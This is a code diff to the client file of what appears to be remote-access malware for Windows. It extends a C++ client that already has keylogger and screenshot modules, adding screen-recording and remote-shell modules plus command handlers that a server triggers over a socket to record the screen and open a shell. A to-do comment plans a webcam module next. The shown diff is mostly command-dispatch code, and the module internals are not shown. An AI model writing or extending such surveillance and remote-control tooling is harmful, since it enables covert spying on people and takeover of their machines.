@@ -1,8 +1,8 @@
-//g++ client.cpp .\modules\module.cpp .\modules\ss_module.cpp .\modules\keylogger\keylogger_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
+//g++ client.cpp .\modules\module.cpp .\modules\ss_module.cpp .\modules\keylogger\keylogger_module.cpp .\modules\screen_recording_module.cpp .\modules\remote_shell_module.cpp -o client.exe -lws2_32 -lgdiplus -lgdi32 -lole32
 
 // TO DO
 // move functions to the modules directory and minimize client.cpp
-// implement keylogger
+// implement webcam and remote shell modules
 // 
 
 #include <iostream>
@@ -20,6 +20,8 @@
 #include <memory>
 #include "modules/ss_module.h"
 #include "modules/keylogger/keylogger_module.h"
+#include "modules/screen_recording_module.h"
+#include "modules/remote_shell_module.h"
 
 #ifdef _WIN32
 #include <winsock2.h>
@@ -53,6 +55,8 @@ std::vector<char> create_message(const std::string& content);
 //Module declarations
 Keylogger_Module keylogger;
 SS_Module screenshot;
+ScreenRecording_Module screenRecording;
+RemoteShell_Module remoteShell;
 
 
 // Signal handler to catch termination signals (like Ctrl+C)
@@ -211,6 +215,52 @@ void handle_command(const std::string& command, SOCKET sock) {
             std::cout << "[Success] Log file sent to server" << std::endl;
         } else {
             std::cout << "[Warning] Log file saved locally but failed to send" << std::endl;
+        }
+    }
+    else if (command == "START_SCREEN_RECORDING") {
+        std::cout << "[Action] Starting screen recording..." << std::endl;
+        
+        try {
+            if (screenRecording.startRecording(sock, 10, 30)) { // 10 seconds, 30 FPS
+                std::cout << "[Success] Screen recording started" << std::endl;
+            } else {
+                std::cout << "[Warning] Failed to start screen recording" << std::endl;
+            }
+        } catch (const std::exception& e) {
+            std::cerr << "[Error] Exception in screen recording: " << e.what() << std::endl;
+        }
+    }
+    else if (command == "STOP_SCREEN_RECORDING") {
+        std::cout << "[Action] Stopping screen recording..." << std::endl;
+        
+        try {
+            screenRecording.stopRecording();
+            std::cout << "[Success] Screen recording stopped" << std::endl;
+        } catch (const std::exception& e) {
+            std::cerr << "[Error] Exception in stopping screen recording: " << e.what() << std::endl;
+        }
+    }
+    else if (command == "START_REMOTE_SHELL") {
+        std::cout << "[Action] Starting remote shell..." << std::endl;
+        
+        try {
+            if (remoteShell.startRemoteShell(sock)) {
+                std::cout << "[Success] Remote shell started" << std::endl;
+            } else {
+                std::cout << "[Warning] Failed to start remote shell" << std::endl;
+            }
+        } catch (const std::exception& e) {
+            std::cerr << "[Error] Exception in remote shell: " << e.what() << std::endl;
+        }
+    }
+    else if (command == "STOP_REMOTE_SHELL") {
+        std::cout << "[Action] Stopping remote shell..." << std::endl;
+        
+        try {
+            remoteShell.stopRemoteShell();
+            std::cout << "[Success] Remote shell stopped" << std::endl;
+        } catch (const std::exception& e) {
+            std::cerr << "[Error] Exception in stopping remote shell: " << e.what() << std::endl;
         }
     }
     else {
